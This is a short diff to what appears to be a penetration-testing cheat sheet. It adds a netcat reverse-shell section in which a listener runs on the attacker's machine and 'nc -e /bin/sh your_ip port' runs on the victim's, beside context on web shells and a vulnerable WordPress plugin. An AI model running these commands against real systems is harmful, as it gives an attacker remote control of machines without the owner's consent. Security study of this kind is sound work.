@@ -213,6 +213,17 @@ $ whoami
 
 Open the page containing the shell and start writing in the msfconsole linux commands: `whoami`.
 
+### Reverse shell with nc
+
+```bash
+# From your pc
+nc -l -k -p port
+
+
+# From victim's pc
+nc -e /bin/sh your_ip port
+```
+
 ## Wordpress
 
 ### Plugin SlideShow < 1.4.7
